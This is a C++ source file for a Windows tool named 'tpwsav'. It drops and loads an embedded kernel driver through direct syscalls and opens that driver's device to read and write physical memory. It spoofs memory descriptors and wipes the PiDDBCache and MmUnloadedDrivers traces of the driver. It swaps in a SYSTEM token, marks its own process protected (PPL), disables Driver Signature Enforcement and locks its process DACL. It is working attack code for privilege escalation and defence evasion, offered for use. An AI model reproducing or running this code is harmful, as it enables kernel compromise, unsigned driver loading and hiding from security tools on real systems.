#include <windows.h>
#include <aclapi.h>
#include <shellapi.h>
#include <stdio.h>
#include "syscalls.h"
#include "symbols.h"
#include "physmem.h"
#include "cleanup.h"
#include "protect.h"
#include "window.h"
#include "dse.h"
#include "driver_bytes.h"

#pragma comment(lib, "shell32.lib")

// --- application open procedure -------------------------------------------
//
// Opening the executable by double-clicking goes through the shell instead of
// an already-open (and usually already-elevated) terminal. The startup path
// must guarantee that:
//   1. a visible console exists before the first printf,
//   2. the process actually holds an elevated token, and
//   3. an early failure does not make the console vanish before it is read.

static bool IsElevated() {
    HANDLE token = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
        return false;

    TOKEN_ELEVATION info = {};
    DWORD size = sizeof(info);
    bool elevated = false;
    if (GetTokenInformation(token, TokenElevation, &info, sizeof(info), &size))
        elevated = info.TokenIsElevated != FALSE;
    CloseHandle(token);
    return elevated;
}

static void EnsureConsole() {
    if (!GetConsoleWindow()) {
        if (AllocConsole()) {
            FILE* f = NULL;
            freopen_s(&f, "CONIN$",  "r", stdin);
            freopen_s(&f, "CONOUT$", "w", stdout);
            freopen_s(&f, "CONOUT$", "w", stderr);
        }
    }

    // Unbuffered so nothing is lost if the console is closed mid-run.
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    HWND console = GetConsoleWindow();
    if (console) {
        ShowWindow(console, SW_SHOWNORMAL);
        SetForegroundWindow(console);
    }
}

static bool RelaunchElevated() {
    wchar_t exePath[MAX_PATH] = {};
    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH))
        return false;

    SHELLEXECUTEINFOW sei = {};
    sei.cbSize       = sizeof(sei);
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb       = L"runas";
    sei.lpFile       = exePath;
    sei.lpParameters = NULL;
    sei.lpDirectory  = NULL;
    sei.nShow        = SW_SHOWNORMAL;

    if (!ShellExecuteExW(&sei)) {
        DWORD err = GetLastError();
        if (err == ERROR_CANCELLED)
            printf("[-] Elevation cancelled\n");
        else
            printf("[-] Failed to relaunch elevated (error %lu)\n", err);
        return false;
    }
    if (sei.hProcess)
        CloseHandle(sei.hProcess);
    return true;
}

// --- crash reporting -------------------------------------------------------
//
// The window/VAD work faults on purpose (the VADs behind the 1 GiB views are
// deliberately truncated), so a failure there used to take the process down with
// an unhandled STATUS_ACCESS_VIOLATION: the console closed and the only trace
// was in the system log. Every phase is tagged and Run() traps the exception
// so a crash says where it happened, then puts the VAD tree back the way it
// was - a process that exits with a truncated VAD still backed by a live
// section is a bugcheck waiting to happen in the section teardown path.

enum RunPhase {
    PH_STARTUP, PH_DROP, PH_LOAD, PH_WINDOW, PH_SPOOF, PH_CLEANUP,
    PH_UNLOAD, PH_RESTORE, PH_PPL, PH_VERIFY, PH_DSE, PH_DACL, PH_DONE
};

static RunPhase g_Phase = PH_STARTUP;
static EXCEPTION_POINTERS* g_LastException = NULL;

static const char* PhaseName(RunPhase p) {
    switch (p) {
        case PH_STARTUP: return "startup / offset resolution";
        case PH_DROP:    return "driver drop / service registry";
        case PH_LOAD:    return "driver load / device open";
        case PH_WINDOW:  return "physical window setup";
        case PH_SPOOF:   return "VAD spoof";
        case PH_CLEANUP: return "PiDDB / MmUnloadedDrivers cleanup";
        case PH_UNLOAD:  return "driver unload";
        case PH_RESTORE: return "VAD restore";
        case PH_PPL:     return "SYSTEM impersonation / PPL";
        case PH_VERIFY:  return "verification";
        case PH_DSE:     return "DSE disable";
        case PH_DACL:    return "process DACL lock";
        case PH_DONE:    return "shutdown";
    }
    return "unknown";
}

// No CRT in the crash path: the heap may be exactly what is broken.
static void RawWrite(const char* text) {
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    if (h == INVALID_HANDLE_VALUE || h == NULL) return;
    DWORD written = 0;
    WriteFile(h, text, (DWORD)lstrlenA(text), &written, NULL);
}

static int CrashFilter(EXCEPTION_POINTERS* ep) {
    g_LastException = ep;
    return EXCEPTION_EXECUTE_HANDLER;
}

// Restoring the VADs only writes pages that were already faulted in, but guard
// it anyway: this runs from an exception handler.
static void SafeRestore() {
    __try {
        RestorePhysWindow();
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        RawWrite("\r\n[!!!] VAD restore faulted too - the window itself is unusable\r\n");
    }
}

// Print the details of whatever exception was last trapped. Split out so the
// sweep's own handler can report with the same detail as the top level.
static void PrintCrashDetail(const char* what) {
    ULONG code = 0;
    ULONG64 rip = 0;
    if (g_LastException) {
        code = (ULONG)g_LastException->ExceptionRecord->ExceptionCode;
        rip = (ULONG64)g_LastException->ContextRecord->Rip;
    }
    char buf[400] = {};
    // wsprintfA is a legacy Win32 formatter and does not understand %ll: it
    // parses "%llX" as "%l" followed by literal "lX", which consumes one
    // argument and shifts every argument after it. Split 64-bit values into
    // high and low dwords instead.
    //
    // A RIP inside our own image is only useful relative to the image base, so
    // report that too - it turns "crashed somewhere in the exe" into an offset
    // that resolves against the module.
    ULONG64 selfBase = (ULONG64)(UINT_PTR)GetModuleHandleA(NULL);
    ULONG64 rel = (selfBase && rip >= selfBase && rip < selfBase + 0x01000000ULL)
                    ? rip - selfBase : 0;
    wsprintfA(buf,
        "\r\n[!!!] %s hit an exception 0x%08lX\r\n"
        "[!!!] at RIP 0x%08lX%08lX (image 0x%08lX%08lX, offset 0x%08lX%08lX)\r\n",
        what, (unsigned long)code,
        (unsigned long)(rip >> 32), (unsigned long)rip,
        (unsigned long)(selfBase >> 32), (unsigned long)selfBase,
        (unsigned long)(rel >> 32), (unsigned long)rel);
    RawWrite(buf);
}

static void ReportCrash() {
    ULONG patches = (ULONG)WindowVadPatchCount();
    PrintCrashDetail("the run");

    char buf[200] = {};
    wsprintfA(buf, "[!!!] %u VAD patch(es) still applied - restoring them now\r\n", patches);
    RawWrite(buf);

    SafeRestore();
}

// The name sweep is best-effort trace cleanup. It must never take the tool down
// with it, so any exception in it ends the sweep rather than the run - but it is
// reported in full, because a silently skipped sweep is a silent failure.
static bool IsSystemToken(HANDLE hToken) {
    if (!hToken) return false;
    BYTE buf[256] = {};
    DWORD needed = 0;
    if (!GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &needed))
        return false;
    BYTE sid[SECURITY_MAX_SID_SIZE] = {};
    DWORD sz = sizeof(sid);
    if (!CreateWellKnownSid(WinLocalSystemSid, NULL, sid, &sz))
        return false;
    return EqualSid(((TOKEN_USER*)buf)->User.Sid, sid);
}

static int RunBody();

static int Run() {
    __try {
        return RunBody();
    }
    __except (CrashFilter(GetExceptionInformation())) {
        ReportCrash();
        return 3;
    }
}

static int RunBody() {
    printf("[*] tpwsav\n\n");

    printf("[*] Resolving syscalls...\n");
    SyscallTable sc = {};
    if (!ResolveSyscalls(&sc)) {
        printf("[-] Failed to resolve syscalls\n");
        return 1;
    }

    KernelOffsets kOffsets = {};
    if (!ResolveKernelOffsets(&kOffsets)) {
        printf("[-] Failed to resolve kernel offsets\n");
        return 1;
    }

    printf("\n[*] Enabling SeLoadDriverPrivilege...\n");
    {
        HANDLE tokenHandle;
        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenHandle);

        TOKEN_PRIVILEGES tp = {};
        LookupPrivilegeValueW(NULL, SE_LOAD_DRIVER_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(tokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);

        if (GetLastError() != 0) {
            printf("[-] Failed to enable SeLoadDriverPrivilege\n");
            return 1;
        }
        CloseHandle(tokenHandle);
        printf("[+] SeLoadDriverPrivilege enabled\n");
    }

    printf("\n[*] Dropping driver to temp...\n");
    g_Phase = PH_DROP;

    wchar_t tempDir[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tempDir);

    DWORD tick = (DWORD)GetTickCount64();
    wchar_t svcName[32] = {};
    wsprintfW(svcName, L"tmp%X", tick);

    wchar_t dropPath[MAX_PATH] = {};
    wsprintfW(dropPath, L"%s%s.sys", tempDir, svcName);

    wchar_t ntPath[MAX_PATH] = {};
    wsprintfW(ntPath, L"\\??\\%s", dropPath);

    HANDLE fileHandle = NULL;
    IO_STATUS_BLOCK ioStatus = {};
    UNICODE_STRING filePath;
    OBJECT_ATTRIBUTES fileAttrs;

    InitUnicodeString(&filePath, ntPath);
    InitializeObjectAttributes(&fileAttrs, &filePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = DoSyscallEx(
        sc.NtCreateFile,
        (ULONG_PTR)&fileHandle,
        (ULONG_PTR)(GENERIC_WRITE | SYNCHRONIZE),
        (ULONG_PTR)&fileAttrs,
        (ULONG_PTR)&ioStatus,
        (ULONG_PTR)NULL,
        (ULONG_PTR)FILE_ATTRIBUTE_NORMAL,
        (ULONG_PTR)FILE_SHARE_READ,
        (ULONG_PTR)5,   // FILE_OVERWRITE_IF
        (ULONG_PTR)0x20, // FILE_SYNCHRONOUS_IO_NONALERT
        (ULONG_PTR)NULL,
        (ULONG_PTR)0
    );

    if (status != 0) {
        printf("[-] Failed to create temp file: 0x%lX\n", status);
        return 1;
    }

    ioStatus = {};
    status = DoSyscallEx(
        sc.NtWriteFile,
        (ULONG_PTR)fileHandle,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,
        (ULONG_PTR)&ioStatus,
        (ULONG_PTR)g_DriverBytes,
        (ULONG_PTR)g_DriverSize,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,
        0, 0
    );

    DoSyscall(sc.NtClose, (ULONG_PTR)fileHandle, 0, 0, 0);

    if (status != 0) {
        printf("[-] Failed to write driver bytes: 0x%lX\n", status);
        return 1;
    }
    printf("[+] Dropped %u bytes\n", g_DriverSize);

    printf("\n[*] Creating service registry key...\n");

    UNICODE_STRING keyPath;
    wchar_t svcRegPath[MAX_PATH] = {};
    wsprintfW(svcRegPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s", svcName);
    InitUnicodeString(&keyPath, svcRegPath);

    OBJECT_ATTRIBUTES keyAttrs;
    InitializeObjectAttributes(&keyAttrs, &keyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE keyHandle = NULL;
    ULONG disposition = 0;

    status = DoSyscallEx(
        sc.NtCreateKey,
        (ULONG_PTR)&keyHandle,
        (ULONG_PTR)KEY_ALL_ACCESS,
        (ULONG_PTR)&keyAttrs,
        (ULONG_PTR)0,
        (ULONG_PTR)NULL,
        (ULONG_PTR)0,
        (ULONG_PTR)&disposition,
        0, 0, 0, 0
    );

    if (status != 0) {
        printf("[-] NtCreateKey failed: 0x%lX\n", status);
        return 1;
    }

    UNICODE_STRING imagePathName;
    InitUnicodeString(&imagePathName, L"ImagePath");

    status = DoSyscallEx(
        sc.NtSetValueKey,
        (ULONG_PTR)keyHandle,
        (ULONG_PTR)&imagePathName,
        (ULONG_PTR)0,
        (ULONG_PTR)REG_EXPAND_SZ,
        (ULONG_PTR)ntPath,
        (ULONG_PTR)((wcslen(ntPath) + 1) * sizeof(wchar_t)),
        0, 0, 0, 0, 0
    );

    if (status != 0) {
        printf("[-] Failed to set ImagePath: 0x%lX\n", status);
        return 1;
    }

    UNICODE_STRING typeName;
    InitUnicodeString(&typeName, L"Type");
    DWORD driverType = 1;

    status = DoSyscallEx(
        sc.NtSetValueKey,
        (ULONG_PTR)keyHandle,
        (ULONG_PTR)&typeName,
        (ULONG_PTR)0,
        (ULONG_PTR)REG_DWORD,
        (ULONG_PTR)&driverType,
        (ULONG_PTR)sizeof(driverType),
        0, 0, 0, 0, 0
    );

    DoSyscall(sc.NtClose, (ULONG_PTR)keyHandle, 0, 0, 0);

    if (status != 0) {
        printf("[-] Failed to set Type: 0x%lX\n", status);
        return 1;
    }
    printf("[+] Service key created\n");

    printf("\n[*] Loading driver...\n");
    g_Phase = PH_LOAD;

    UNICODE_STRING servicePath;
    InitUnicodeString(&servicePath, svcRegPath);

    status = DoSyscall(
        sc.NtLoadDriver,
        (ULONG_PTR)&servicePath,
        0, 0, 0
    );

    if (status == 0xC000010E || status == 0xC0000035) {
        printf("[*] Driver already loaded (0x%lX), reusing\n", status);
    } else if (status != 0) {
        printf("[-] NtLoadDriver failed: 0x%lX\n", status);
        return 1;
    } else {
        printf("[+] Driver loaded\n");
    }

    DeleteFileW(dropPath);

    printf("\n[*] Opening device handle...\n");

    HANDLE deviceHandle = NULL;
    ioStatus = {};
    UNICODE_STRING devicePath;
    OBJECT_ATTRIBUTES deviceAttrs;

    InitUnicodeString(&devicePath, L"\\DosDevices\\EBIoDispatch");
    InitializeObjectAttributes(&deviceAttrs, &devicePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = DoSyscallEx(
        sc.NtCreateFile,
        (ULONG_PTR)&deviceHandle,
        (ULONG_PTR)(GENERIC_READ | GENERIC_WRITE),
        (ULONG_PTR)&deviceAttrs,
        (ULONG_PTR)&ioStatus,
        (ULONG_PTR)NULL,
        (ULONG_PTR)0,
        (ULONG_PTR)0,
        (ULONG_PTR)3,
        (ULONG_PTR)0,
        (ULONG_PTR)NULL,
        (ULONG_PTR)0
    );

    if (status != 0) {
        printf("[-] Failed to open device: 0x%lX\n", status);
        return 1;
    }
    printf("[+] Device handle: 0x%p\n", deviceHandle);

    printf("\n[*] Finding System CR3...\n");

    ULONG64 systemCr3 = FindSystemCr3(deviceHandle, &sc, kOffsets.NtoskrnlBase);
    if (!systemCr3) {
        printf("[-] Failed to find System CR3\n");
        return 1;
    }
    printf("[+] System CR3: 0x%llX\n", systemCr3);

    g_Phase = PH_WINDOW;
    if (!SetupPhysWindow(deviceHandle, &sc, systemCr3, &kOffsets)) {
        printf("[-] Failed to set up physical memory window\n");
        return 1;
    }

    g_Phase = PH_SPOOF;
    SpoofWindowVADs(deviceHandle, &sc, systemCr3, &kOffsets);

    g_Phase = PH_CLEANUP;
    printf("\n[*] Trace cleanup\n");

    wchar_t driverFileName[64] = {};
    wsprintfW(driverFileName, L"%s.sys", svcName);
    CleanPiDDBCache(deviceHandle, &sc, systemCr3, &kOffsets, driverFileName);

    MmCleanupContext mmCtx = {};
    bool mmPrepared = PrepareMmCleanup(deviceHandle, &sc, systemCr3, &kOffsets,
                                      driverFileName, &mmCtx);

    // Put the VADs back now, before anything else touches the window again
    // (PPL, DSE, verification). A VAD tree that claims 64 KiB for a 1 GiB section
    // is exactly what makes those steps fault, and restoring here means the
    // process can never exit - cleanly or not - with a truncated VAD still in
    // place.
    g_Phase = PH_RESTORE;
    RestorePhysWindow();

    g_Phase = PH_UNLOAD;
    printf("\n[*] Unloading driver...\n");
    DoSyscall(sc.NtClose, (ULONG_PTR)deviceHandle, 0, 0, 0);

    status = DoSyscall(sc.NtUnloadDriver, (ULONG_PTR)&servicePath, 0, 0, 0);
    printf("[%c] Driver unloaded\n", status == 0 ? '+' : '-');

    if (mmPrepared && status == 0)
        FinishMmCleanup(&mmCtx);

    InitializeObjectAttributes(&keyAttrs, &keyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = DoSyscallEx(
        sc.NtCreateKey,
        (ULONG_PTR)&keyHandle,
        (ULONG_PTR)KEY_ALL_ACCESS,
        (ULONG_PTR)&keyAttrs,
        0, 0, 0,
        (ULONG_PTR)&disposition,
        0, 0, 0, 0
    );
    if (status == 0) {
        DoSyscall(sc.NtDeleteKey, (ULONG_PTR)keyHandle, 0, 0, 0);
        DoSyscall(sc.NtClose, (ULONG_PTR)keyHandle, 0, 0, 0);
    }
    printf("[+] Registry key deleted\n");

    g_Phase = PH_PPL;
    // Primary token first: this is what makes the *process* SYSTEM. The thread
    // impersonation below is a fallback for when the swap is refused.
    SetProcessSystemToken(systemCr3, &kOffsets);

    // The console host was spawned by CSRSS back in EnsureConsole(), long
    // before any of this ran, so it is still running as the original account.
    // If we own the console, bring its host up to the same state as us.
    if (GetConsoleWindow()) {
        if (!MatchChildToSystem(systemCr3, &kOffsets, L"conhost.exe"))
            printf("[-] No conhost child found to match (fine if run from a terminal)\n");
    }

    if (!ImpersonateSystem())
        printf("[-] Failed to impersonate SYSTEM on this thread\n");

    // PPL via physical memory window — no driver needed
    {
        ULONG64 ourEprocessVA = 0;
        if (WindowFindOurEprocess(systemCr3, &kOffsets, &ourEprocessVA)) {
            printf("[*] Our EPROCESS: 0x%llX (Protection off 0x%X)\n",
                   ourEprocessVA, kOffsets.Protection);
            WindowSetProcessPpl(systemCr3, &kOffsets, ourEprocessVA, PPL_FULL_WINSYSTEM);
        } else {
            printf("[-] PPL: could not locate our EPROCESS\n");
        }
    }

    g_Phase = PH_VERIFY;
    printf("\n[*] Verification\n");

    __try {
        ULONG64 ntPhys = WindowVirtToPhys(systemCr3, kOffsets.NtoskrnlBase);
        if (ntPhys) {
            USHORT mz = (USHORT)WindowRead32(ntPhys);
            printf("[%c] VirtToPhys: %s\n", mz == 0x5A4D ? '+' : '-',
                   mz == 0x5A4D ? "OKAY" : "FAILED");
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] VirtToPhys: FAILED\n");
    }

    {
        typedef NTSTATUS(WINAPI* fnNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        auto NtQIP = (fnNtQIP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        if (NtQIP) {
            BYTE level = 0;
            ULONG len = 0;
            NTSTATUS s = NtQIP(GetCurrentProcess(), 61, &level, sizeof(level), &len);
            printf("[%c] PPL: 0x%02X%s\n", (s == 0 && level == PPL_FULL_WINSYSTEM) ? '+' : '-',
                   level,
                   (s == 0 && level == PPL_FULL_WINSYSTEM) ? "" : "  (wanted 0x44)");
            printf("    raw Protection now: 0x%02X\n", level);
        }
    }

    // Re-read the bytes at the end of the run. If they differ from what was
    // written, something in between rewrote them.
    {
        ULONG64 ourEproc = 0;
        if (WindowFindOurEprocess(systemCr3, &kOffsets, &ourEproc)) {
            printf("[*] raw Protection: ours 0x%02X\n",
                   WindowGetProcessProtection(systemCr3, &kOffsets, ourEproc));
        }
        ReportChildProtection(systemCr3, &kOffsets, L"conhost.exe");
    }

    {
        // Report the two tokens separately. The thread token is what API calls
        // in this thread are checked against; the primary token is what the
        // process actually is. Reporting only the thread token makes a process
        // that is still running as admin look like SYSTEM.
        HANDLE procTok = NULL, threadTok = NULL;
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &procTok);
        OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &threadTok);

        bool sys = IsSystemToken(procTok);
        bool thr = IsSystemToken(threadTok);
        printf("[%c] Process token: %s\n", sys ? '+' : '-', sys ? "SYSTEM" : "NOT SYSTEM");
        printf("[%c] Thread token:  %s\n", thr ? '+' : '-', thr ? "SYSTEM" : "NOT SYSTEM");
        if (procTok) CloseHandle(procTok);
        if (threadTok) CloseHandle(threadTok);
    }

    printf("[+] System CR3: 0x%llX\n", systemCr3);

    g_Phase = PH_DSE;
    DisableDSE(systemCr3, &kOffsets);

    // Last: the deny ACE covers this process too, so nothing that needs to open
    // it may run after this point.
    g_Phase = PH_DACL;
    LockProcessDACL();

    g_Phase = PH_DONE;
    printf("\n[*] Press Enter to exit...\n");
    (void)getchar();

    // No-op unless a crash path left something patched, but keep it as a net.
    RestorePhysWindow();
    return 0;
}

int main() {
    EnsureConsole();

    if (!IsElevated()) {
        printf("[*] Administrator privileges required, elevating...\n");
        if (RelaunchElevated())
            return 0;

        printf("[-] Could not obtain administrator privileges.\n");
        printf("[*] Right-click tpwsav.exe and choose 'Run as administrator'.\n");
        printf("\nPress Enter to exit...");
        (void)getchar();
        return 1;
    }

    int rc = Run();
    if (rc != 0) {
        // When launched by double-click nothing keeps the window alive after
        // a failure, so the console just flashes. Let the error be read.
        printf("\nPress Enter to exit...");
        (void)getchar();
    }
    return rc;
}
